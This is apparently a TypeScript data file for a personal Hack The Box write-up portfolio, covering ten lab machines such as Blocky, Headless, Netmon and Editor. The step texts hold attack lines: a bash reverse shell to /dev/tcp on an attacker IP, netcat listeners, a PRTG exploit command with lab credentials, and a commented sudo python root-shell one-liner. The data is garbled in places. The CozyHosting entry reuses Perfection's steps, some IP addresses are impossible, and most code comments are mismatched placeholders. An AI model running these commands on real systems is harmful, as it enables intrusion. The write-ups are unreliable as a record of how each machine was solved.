import { Difficulty, OS, HTBMachine, UserStats } from './types';

/**
 * Update your HTB Profile Stats here.
 * These appear in the stats overview bar.
 */
export const USER_STATS: UserStats = {
  rank: 'Script Kiddie',
  points: 1289,
  machinesSolved: 29,
  challengesSolved: 12,
  pakistanRanking: 32
};

/**
 * This is your main database of solved machines.
 */
export const HTB_MACHINES: HTBMachine[] = [
  {
    id: '1',
    name: 'Blocky',
    os: OS.LINUX,
    difficulty: Difficulty.EASY,
    points: 20,
    releaseDate: '21 Jul, 2017',
    avatarUrl: '/blocky.png',
    tags: ['Web', 'CMS Exploit'],
    ipAddress: '10.10.10.37',
    description: 'Blocky is fairly simple overall, and was based on a real-world machine. It demonstrates the risks of bad password practices as well as exposing internal files on a public facing system. On top of this, it exposes a massive potential attack vector: Minecraft. Tens of thousands of servers exist that are publicly accessible, with the vast majority being set up and configured by young and inexperienced system administrators.',
    enumeration: [
      {
        title: 'Initial Nmap Scan',
        content: 'First we ran the nmap scan as usual using nmap -sCV Machine-IP. Scan revealed ports 21 (FTP), 22 (SSH), 80 (HTTP), and 8192-closed.',
        //code: 'nmap -sC -sV 10.10.10.37',
        imageUrls: [
          '/screenshots/Blocky/nmap.png'
        ]
      },
      {
        title: 'FTP Anonymous Access',
        content: 'We got three open ports `ftp` , `ssh` and `http`. First we tried to connect to `FTP` using `anonymous:anonymous` credentials, but denied.',
        //code: 'ftp 10.10.10.37\nConnected to 10.10.10.37.\n220 (vsFTPd 3.0.3)\nName: anonymous\n331 Please specify the password.\nPassword: \n230 Login successful.',
        imageUrls: [
          '/screenshots/Blocky/ftp.png'
        ]
      },
      {
        title: 'Directory BruteForce',
        content: 'Then we moved to the website, and saw that the website is powered by wordpress and we did `Directory` Bruteforcing.',
        //code: 'ftp 10.10.10.37\nConnected to 10.10.10.37.\n220 (vsFTPd 3.0.3)\nName: anonymous\n331 Please specify the password.\nPassword: \n230 Login successful.',
        imageUrls: [
          '/screenshots/Blocky/bruteforce.png'
        ]
      },
      {
        title: 'Exploring Directory',
        content: 'Then in parallel we also used to `wpscan`, and from directory bruteforcing we found `/plugins` interesting.',
        //code: 'ftp 10.10.10.37\nConnected to 10.10.10.37.\n220 (vsFTPd 3.0.3)\nName: anonymous\n331 Please specify the password.\nPassword: \n230 Login successful.',
        imageUrls: [
          '/screenshots/Blocky/plugins.png'
        ]
      },
      {
        title: 'Unpacking BlockyCore.jar',
        content: 'We unpacked the `jar` file and used `strings` on some of the files, from the internet we got to know this file may contain sensitive data,so we got the `username` and `password`',
        //code: 'ftp 10.10.10.37\nConnected to 10.10.10.37.\n220 (vsFTPd 3.0.3)\nName: anonymous\n331 Please specify the password.\nPassword: \n230 Login successful.',
        imageUrls: [
          '/screenshots/Blocky/blockycore.png'
        ]
      },
    ],
    foothold: [
      {
        title: 'Gaining Access',
        content: 'We tried the root@Machine-IP and used the password we found but denied. So we moved to the wpscan for enumerating users on which we can try the username and password. Wpscan found the user notch and we tried to ssh using notch@Machine-IP and got logged in.',
        //code: 'gobuster dir -u http://10.10.10.37 -w /usr/share/wordlists/dirb/common.txt',
        imageUrls: ['/screenshots/Blocky/enumerating.png','/screenshots/Blocky/user.png']
      },
    ],
    privEsc: [
      {
        title: 'Sudo -l',
        content: 'We got logged in as notch and found the user.txt, we ran the command sudo -l to check what files can be run as sudo after running we checked the that user notch can run any command as sudo, so we moved to the root user using sudo su and got root flag.',
        //code: 'sudo -l\nsudo su',
        imageUrls: ['/screenshots/Blocky/pwned.png']
      }
    ]
  },
  {
    id: '2',
    name: 'Conversor',
    os: OS.LINUX,
    difficulty: Difficulty.EASY,
    points: 20,
    releaseDate: '25th October, 2025',
    avatarUrl: '/conversor.png',
    tags: ['Web','File Upload Attacks'],
    ipAddress: '10.10.11.92',
    description: 'A beginner-friendly Linux machine focusing on web application vulnerabilities and File Uplaod Attacks.',
    enumeration: [
      {
        title: 'Nmap Scan and Adding Host',
        content: 'First we ran the nmap scan, and found port 80 and 22 open. We added the IP into the hosts file with domain conversor.htb.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Conversor/nmap.png','/screenshots/Conversor/adding-host.png']
      },
      {
        title: 'Directory Bruteforcing Scan',
        content: 'We also Directory Bruteforced but did not find anything interesting.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Conversor/bruteforce.png']
      },
      {
        title: 'Exploring Website',
        content: 'After moving to the website, we saw to options to upload files with extensions xml and xslt , it strongly remineded me that XXE injection vulnerability could exist.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Conversor/website.png']
      }
    ],
    foothold: [
      {
        title: 'File Upload & Initial Access',
        content: 'Then using the GPT we generated the reverse webshell script, and uploaded it meanwhile in another termianl we opened nc -lnvp 4444 and our shell was spawned.',
        //code: "python3 exploit.py http://10.10.11.11",
        imageUrls: ['/screenshots/Conversor/revshell.png','/screenshots/Conversor/netcat.png']
      },
      {
        title: 'Upgrading TTY or Tele Type Writer',
        content: 'Now we upgradedf out tty using `python3 -c import pty;pty.spawn("/bin/bash")`.',
        //code: "python3 exploit.py http://10.10.11.11",
        imageUrls: ['/screenshots/Conversor/tty.png']
      },
      {
        title: 'Getting User & Password',
        content: 'After exploring the `converor.htb` directory we were managed to displayed the users & passwords, and using crackstation we cracked the hash.',
        //code: "python3 exploit.py http://10.10.11.11",
        imageUrls: ['/screenshots/Conversor/u&p.png','/screenshots/Conversor/crackstation.png']
      },
      {
        title: 'User Flag',
        content: 'After logging in we got the user flag.',
        //code: "python3 exploit.py http://10.10.11.11",
        imageUrls: ['/screenshots/Conversor/user.png']
      }
    ],
    privEsc: [
      {
        title: 'Root Escalation',
        content: 'After checking permissions which command can user run as root we got, usr/sbin/restart. From there we GPT what we could do and got privileged escalted to root and got the root flag.',
        //code: 'sudo -l\nsudo /usr/bin/python3 -c \'import os; os.setuid(0); os.system("/bin/bash")\'',
        imageUrls: ['/screenshots/Conversor/Sudo.png','/screenshots/Conversor/root.png']
      }
    ]
  },
  {
    id: '3',
    name: 'Headless',
    os: OS.LINUX,
    difficulty: Difficulty.EASY,
    points: 20,
    releaseDate: '23rd March, 2024',
    avatarUrl: '/headless.png',
    tags: ['Web','XSS, User-Agent'],
    ipAddress: '10.10.11.92',
    description: 'Headless is an easy-difficulty Linux machine that features a Python Werkzeug server hosting a website. The website has a customer support form, which is found to be vulnerable to blind Cross-Site Scripting (XSS) via the User-Agent header. This vulnerability is leveraged to steal an admin cookie, which is then used to access the administrator dashboard. The page is vulnerable to command injection, leading to a reverse shell on the box. Enumerating the user’s mail reveals a script that does not use absolute paths, which is leveraged to get a shell as root.',
    enumeration: [
      {
        title: 'Nmap Scan',
        content: 'First we ran the nmap scan, and got 2 ports open http listening on port 5000 and ssh, HTTP on port 5000 means a web service (often a dev server like Flask) is running on a non-standard port; HTTP is not required to be on port 80.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Headless/nmap.png','/screenshots/Headless/website.png']
      },
      {
        title: 'Exploring Site',
        content: 'We clicked for question and moved to a contact page. We first tested the site with simple `colon` to test for sqli but it didnt work.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Headless/sqli.png']
      },
      {
        title: 'Cross Site Scripting',
        content: 'Then we tried simple XSS payload and it triggered security mechanism.The site displayd the message that hacking attempt detected.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Headless/xss.png','/screenshots/Headless/detected.png']
      },
      {
        title: 'Directory Bruteforce',
        content: 'Meanwhile our Gobuster scan was completed using common.txt wordlist and we found /dashboard and /support pages. We tried to access the /dashbaord but we got the internal server error',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Headless/directory.png','/screenshots/Headless/dashboard.png']
      },
      {
        title: 'Burpsuite',
        content: 'Further we also did not find anything interesting in the burpsuite.We then again moved the /support page, in the burpsuite we noticed that is_admin header is being passed to check if the user is admin or not.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Headless/burp.png','/screenshots/Headless/support.png']
      },
      {
        title: 'User-Agent XSS',
        content: 'We then again submitted the form and injected the xss payload to steal cookie in user-agent header, while we opened the python -m http.server 5000.We got the cookie in the python server and in the burp response too via intercept the response.we copied the cookie and decoded it using cyberchef and got the admin cookie.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Headless/xss2.png','/screenshots/Headless/python.png','/screenshots/Headless/cookie.png']
      },
      {
        title: 'Dashboard Page',
        content: 'We moved the /dashboard page and it said unauthorized this time. Refreshing the page and in burpsuite we altered the cookie we decoded.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Headless/admincookie.png','/screenshots/Headless/admindash.png']
      }
    ],
    foothold: [
      {
        title: 'Command Injection',
        content: 'Clicking on the generate report button and altering the cookie again we got the message, systems are running up. Now again their was only one parameter which was date, so we tried command injection. And it confirmed command injection was possbile here.',
        //code: "python3 exploit.py http://10.10.11.11",
        imageUrls: ['/screenshots/Headless/report.png','/screenshots/Headless/CI-confirm.png']
      },
      {
        title: 'Reverse Shell',
        content: 'Now we need to setup the reverse shell, so we from pentest monkey we prepared our shell and used command ;bash -c bash -i >& /dev/tcp/10.10.14.47/90010>&1 to spawn the shell.',
        //code: "python3 exploit.py http://10.10.11.11",
        imageUrls: ['/screenshots/Headless/rev.png','/screenshots/Headless/netcat.png']
      },
      {
        title: 'User Flag',
        content: 'Our shell popped up and we got the user flag.',
        //code: "python3 exploit.py http://10.10.11.11",
        imageUrls: ['/screenshots/Headless/user.png']
      }
    ],
    privEsc: [
      {
        title: 'Root Escalation',
        content: 'Then we ran sudo -l to check what this user can run as root, and we found /usr/bin/syscheck. After that giving scenario to gpt we escalated our privileges to root and got the root flag.',
        //code: 'sudo -l\nsudo /usr/bin/python3 -c \'import os; os.setuid(0); os.system("/bin/bash")\'',
        imageUrls: ['/screenshots/Headless/root.png','/screenshots/Headless/root2.png']
      }
    ]
  },
  {
    id: '4',
    name: 'Shocker',
    os: OS.LINUX,
    difficulty: Difficulty.EASY,
    points: 20,
    releaseDate: '30th September, 2017',
    avatarUrl: '/shocker.png',
    tags: ['Web'],
    ipAddress: '10.10.11.92',
    description: 'Shocker, while fairly simple overall, demonstrates the severity of the renowned Shellshock exploit, which affected millions of public-facing servers.',
    enumeration: [
      {
        title: 'Nmap Scan',
        content: 'First we ran the nmap scan and found port 80 and 22 open.We moved to the website but did not find anything useful.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Shocker/nmap.png','/screenshots/Shocker/website.png']
      },
      {
        title: 'Directory Bruteforce',
        content: 'We then directory bruteforced. We tried with wordlist directory-list-2.3-small.txt but we didnt find anything, we used common.txt and found that cgi-bin was there but forbidden to access. ',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Shocker/brute.png','/screenshots/Shocker/cgi-bin.png']
      },
      {
        title: 'Bruteforcing cgi-bin',
        content: 'We then even burteforced target-IP/cgi-bin/ and found user.sh file. Interestingly there was a word uptime upon searching the web we found that if a web endpoint returns the output of a Linux command (like uptime), it means the server is already executing shell commands — so you can test control by running id or whoami.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Shocker/brute2.png','/screenshots/Shocker/cgi-bin2.png']
      }
    ],
    foothold: [
      {
        title: 'Gaining Access',
        content: 'We then generated our payload using gpt and were able to retrieve the information.',
        //code: "python3 exploit.py http://10.10.11.11",
        imageUrls: ['/screenshots/Shocker/access.png','/screenshots/Shocker/access2.png']
      }
    ],
    privEsc: [
      {
        title: 'Root Escalation',
        content: 'We opened a nc -lnvp 4444 and got the shell.',
        //code: 'sudo -l\nsudo /usr/bin/python3 -c \'import os; os.setuid(0); os.system("/bin/bash")\'',
        imageUrls: ['/screenshots/Shocker/priv.png']
      }
    ]
  },
  {
    id: '5',
    name: 'Perfection',
    os: OS.LINUX,
    difficulty: Difficulty.EASY,
    points: 20,
    releaseDate: '2nd March, 2024',
    avatarUrl: '/perfection.png',
    tags: ['Web','SSTI'],
    ipAddress: '10.10.111.292',
    description: 'Perfection is an easy Linux machine that features a web application with functionality to calculate student scores. This application is vulnerable to Server-Side Template Injection (SSTI) via regex filter bypass. A foothold can be gained by exploiting the SSTI vulnerability. Enumerating the user reveals they are part of the sudo group. Further enumeration uncovers a database with password hashes, and the user&amp;#039;s mail reveals a possible password format. Using a mask attack on the hash, the user&amp;#039;s password is obtained, which is leveraged to gain root access.',
    enumeration: [
      {
        title: 'Nmap Scan',
        content: 'First we ran the usual nmap scan and found that 2 ports ssh and http were open. After moving to the website we found that it is written in ruby language (Wappalyzer) and weighted-grade endpoint calculates the CGPA.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Perfection/nmap.png']
      },
      {
        title: 'SSTI Detection',
        content: 'After some trial and error we found that application is vulnerable to SSTI and if we use /n as url-encoded we can escape the newline and use our SSTI Ruby Payload <%= 7 * 7 %> in url-encoded form. We got our payload from https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Ruby.md',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Perfection/ssti.png']
      },
      {
        title: 'Found Username',
        content: 'Using /etc/passwd payload from above github repo we read the file and got to know that susan is the username.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Perfection/ssti1.png']
      }
    ],
    foothold: [
      {
        title: 'Gaining Access',
        content: 'Using this payload we spawned shell on our terminal and got user.txt. also nc -lnvp 4444 was running in that terminal.',
        //code: "python3 exploit.py http://10.10.11.11",
        imageUrls: ['/screenshots/Perfection/access.png','/screenshots/Perfection/netcat.png']
      }
    ],
    privEsc: [
      {
        title: 'Root Escalation',
        content: 'Running ./linpeas.sh on the target, we found interesting file /var/mail/susan. Using hashcat we cracked the password, reading the var/mail/susan gave us the clue that firstname_firstname-backward_1-100000000 any number is the password',
        //code: 'sudo -l\nsudo /usr/bin/python3 -c \'import os; os.setuid(0); os.system("/bin/bash")\'',
        imageUrls: ['/screenshots/Perfection/root1.png','/screenshots/Perfection/root2.png','/screenshots/Perfection/pass.png','/screenshots/Perfection/final.png']
      }
    ]
  },
  {
    id: '6',
    name: 'CozyHosting',
    os: OS.LINUX,
    difficulty: Difficulty.EASY,
    points: 20,
    releaseDate: '2nd September, 2023',
    avatarUrl: '/cozyhosting.png',
    tags: ['Web','Spring Boot'],
    ipAddress: '10.10.111.292',
    description: 'CozyHosting is an easy-difficulty Linux machine that features a Spring Boot application. The application has the Actuator endpoint enabled. Enumerating the endpoint leads to the discovery of a user&#039;s session cookie, leading to authenticated access to the main dashboard. The application is vulnerable to command injection, which is leveraged to gain a reverse shell on the remote machine. Enumerating the application&#039;s JAR file, hardcoded credentials are discovered and used to log into the local database. The database contains a hashed password, which once cracked is used to log into the machine as the user josh. The user is allowed to run ssh as root, which is leveraged to fully escalate privileges.',
    enumeration: [
      {
        title: 'Nmap Scan',
        content: 'Firt we ran the nmap scan.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Perfection/nmap.png']
      },
      {
        title: 'SSTI Detection',
        content: 'After some trial and error we found that application is vulnerable to SSTI and if we use /n as url-encoded we can escape the newline and use our SSTI Ruby Payload <%= 7 * 7 %> in url-encoded form. We got our payload from https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Ruby.md',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Perfection/ssti.png']
      },
      {
        title: 'Found Username',
        content: 'Using /etc/passwd payload from above github repo we read the file and got to know that susan is the username.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Perfection/ssti1.png']
      }
    ],
    foothold: [
      {
        title: 'Gaining Access',
        content: 'Using this payload we spawned shell on our terminal and got user.txt. also nc -lnvp 4444 was running in that terminal.',
        //code: "python3 exploit.py http://10.10.11.11",
        imageUrls: ['/screenshots/Perfection/access.png','/screenshots/Perfection/netcat.png']
      }
    ],
    privEsc: [
      {
        title: 'Root Escalation',
        content: 'Running ./linpeas.sh on the target, we found interesting file /var/mail/susan. Using hashcat we cracked the password, reading the var/mail/susan gave us the clue that firstname_firstname-backward_1-100000000 any number is the password',
        //code: 'sudo -l\nsudo /usr/bin/python3 -c \'import os; os.setuid(0); os.system("/bin/bash")\'',
        imageUrls: ['/screenshots/Perfection/root1.png','/screenshots/Perfection/root2.png','/screenshots/Perfection/pass.png','/screenshots/Perfection/final.png']
      }
    ]
  },
  {
    id: '7',
    name: 'Antique',
    os: OS.LINUX,
    difficulty: Difficulty.EASY,
    points: 20,
    releaseDate: '2nd September, 2023',
    avatarUrl: '/antique.png',
    tags: ['Web','CUPS, Printer'],
    ipAddress: '10.10.101.22',
    description: 'Antique is an easy Linux machine featuring a network printer disclosing credentials through SNMP string which allows logging into telnet service. Foothold can be obtained by exploiting a feature in printer. CUPS administration service running locally. This service can be exploited further to gain root access on the server.',
    enumeration: [
      {
        title: 'Nmap Scan',
        content: 'First we ran the nmap scan and we got only one telnet port open, even trying with default credentials did not work. Then we moved to nmap UDP port scan and found snmp/161 is open.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Antique/nmap.png','/screenshots/Antique/nmap-udp.png']
      },
      {
        title: 'SNMP enumeration',
        content: 'After searching about snmp on the internet we got article on hacktricks and tried some commands from the site.50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Antique/snmp.png']
      },
      {
        title: 'Found Password via CyberChef',
        content: 'We got BITS given in the upper text, after putting them into cyberchef and using hex decoder we got the password.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Antique/cyber.png']
      }
    ],
    foothold: [
      {
        title: 'Gaining Access',
        content: 'Using the password we found tried to connect to telnet port and we got connected, and got the user flag.',
        //code: "python3 exploit.py http://10.10.11.11",
        imageUrls: ['/screenshots/Antique/telnet.png']
      }
    ],
    privEsc: [
      {
        title: 'Root Escalation',
        content: 'we tried sudo -l but it wasnt allowed. Now we ran the nc -lnvp 9001 and ont he telnet we used reverse shell command from pentest monkey to spawn the shell.',
        //code: 'sudo -l\nsudo /usr/bin/python3 -c \'import os; os.setuid(0); os.system("/bin/bash")\'',
        imageUrls: ['/screenshots/Antique/sudo.png','/screenshots/Antique/rev.png']
      },
      {
        title: 'CVE Finding',
        content: 'After running the netstat -ant we got to know that localhost is listening on 631, after surfing the web we got to know that it belongs to CUPS and it has CVE assigned CVE-2012-5519.We downloaded it from github, hosted it via python server. and moved to the target machine.After running it we tried to read /root/root.txt and got our root flag.',
        //code: 'sudo -l\nsudo /usr/bin/python3 -c \'import os; os.setuid(0); os.system("/bin/bash")\'',
        imageUrls: ['/screenshots/Antique/netstat.png','/screenshots/Antique/cve.png','/screenshots/Antique/root.png']
      }
    ]
  },
  {
    id: '8',
    name: 'Netmon',
    os: OS.LINUX,
    difficulty: Difficulty.EASY,
    points: 20,
    releaseDate: '2nd March, 2019',
    avatarUrl: '/netmon.png',
    tags: ['Web','PRTG Network'],
    ipAddress: '10.120.101.222',
    description: 'Netmon is an easy difficulty Windows box with simple enumeration and exploitation. PRTG is running, and an FTP server with anonymous access allows reading of PRTG Network Monitor configuration files. The version of PRTG is vulnerable to RCE which can be exploited to gain a SYSTEM shell.',
    enumeration: [
      {
        title: 'Nmap Scan',
        content: 'first we ran the nmap scan as usual. We got ftp 21 and http 80 was open.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Netmon/nmap.png']
      },
      {
        title: 'FTP Anonymous Access',
        content: 'From ftp we got the user.txt flag.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Netmon/ftp.png','/screenshots/Netmon/user.png']
      }
    ],
    foothold: [
      {
        title: 'Found Username and Password from Backup File',
        content: 'From programdata/Paessler/PRTG Network Monitor we got backup file which contained admin credentials. User and Pass was prtgadmin and PrTg@dmin2018, but it wqas one year ahead and on PRTG network users are required to upgrade the year so we tried PrTg@dmin2019 and got logged in. We checked the version of the PRTG and got to know it was exploitable, using CVE-2018-9276. We used this command python3 exploit.py -i 10.129.12.59 -p 80 --lhost 10.10.14.52 --lport 4444 --user prtgadmin --password PrTg@dmin2019 and in other terminal we opened nc -lnvp 4444 and on nc terminal we got the shell.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Netmon/exploit.png','/screenshots/Netmon/netcat.png']
      }
    ],
    privEsc: [
      {
        title: 'Root Escalation',
        content: 'After running the exploit, and trying to cat /root/root.txt we got the the root flag.',
        //code: 'sudo -l\nsudo /usr/bin/python3 -c \'import os; os.setuid(0); os.system("/bin/bash")\'',
        imageUrls: ['/screenshots/Antique/root.png']
      }
    ]
  },
  {
    id: '9',
    name: 'Writeup',
    os: OS.LINUX,
    difficulty: Difficulty.EASY,
    points: 20,
    releaseDate: '8th June, 2019',
    avatarUrl: '/writeup.png',
    tags: ['Web','CMS','SQLi'],
    ipAddress: '10.12.111.222',
    description: 'Writeup is an easy difficulty Linux box with DoS protection in place to prevent brute forcing. A CMS susceptible to a SQL injection vulnerability is found, which is leveraged to gain user credentials. The user is found to be in a non-default group, which has write access to part of the PATH. A path hijacking results in escalation of privileges to root.',
    enumeration: [
      {
        title: 'Nmap Scan',
        content: 'First we ran the nmap scan and got port 22 and port 80 open. We visited the site and robots.txt and got their are few directories listed.We listed the contents of http://writeup.htb/writeup/ and got to know via wappalyzer that the site is using CMS Made Simple.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Writeup/cms.png','/screenshots/Writeup/wap.png','/screenshots/Writeup/writeup.png']
      }
    ],
    foothold: [
      {
        title: 'Getting Username and Password',
        content: 'We used CMS Made Simple Command on Kali and it listed all the Exploits working on the available versions, their we found that SQL Injection can be injected.We downloaded the exploit using CMS Made Simple -m exploit-name-or-number.py -m denotes mirror in our directory.Then we used python2 Exploit.py -u http://writeup.htb/writeup and it found SQLi. From there wo got the username and password to login. We SSH jkr@Machine-IP and found the user.txt flag.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Writeup/user.png']
      }
    ],
    privEsc: [
      {
        title: 'Root Escalation',
        content: 'Now from there we, checked the permission using sudo -l which commands can be run as root from that user and using GPT, we privilege escalated and got into root user and got the root.txt flag.',
        //code: 'sudo -l\nsudo /usr/bin/python3 -c \'import os; os.setuid(0); os.system("/bin/bash")\'',
        imageUrls: ['/screenshots/Writeup/root.png']
      }
    ]
  },
  {
    id: '10',
    name: 'Editor',
    os: OS.LINUX,
    difficulty: Difficulty.EASY,
    points: 20,
    releaseDate: '2nd August, 2025',
    avatarUrl: '/editor.png',
    tags: ['Web','CMS','SQLi'],
    ipAddress: '10.12.111.222',
    description: 'The Editor machine on HackTheBox (HTB) is a Linux machine categorized as an easy difficulty challenge. It features a SimplistCode Pro code editor running on an XWiki instance at port 8080, which is vulnerable to a remote code execution (RCE) exploit (CVE-2025-24893) due to improper sandboxing of Groovy expressions in the SolrSearch macro.',
    enumeration: [
      {
        title: 'Nmap Scan',
        content: 'First we ran the nmap -sCV IP on the given address.After running nmap we found 3 ports open ssh, 80 and 8080, we also added the IP addres of the machine to the /etc/hosts, using echo "IP editor.htb | sudo tee -a /etc/hosts.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Editor/nmap.png','/screenshots/Editor/hosts.png']
      },
      {
        title: 'Directory Bruteforce',
        content: 'We tried running Gobuster on port 80 link but didnt get any directories listed.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Editor/bruteforce.png']
      },
      {
        title: 'Found Site Using Java jetty ',
        content: 'Then we tried to access the site on port 8080 and got to know that site is using jetty with variant xwifi Debian 10.15.8, we searched that version exploit on internet and got the exploit on github.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Editor/jetty.png']
      },
    ],
    foothold: [
      {
        title: 'Gaining Access',
        content: 'We ran the exploit avavilble on github while in other terminal we ran nc -lnvp 4444. We got connected on our nc -lnvp 4444. We got to know that hibernate.cfg.xml file contains the password, after some enumeration and searching the web.',
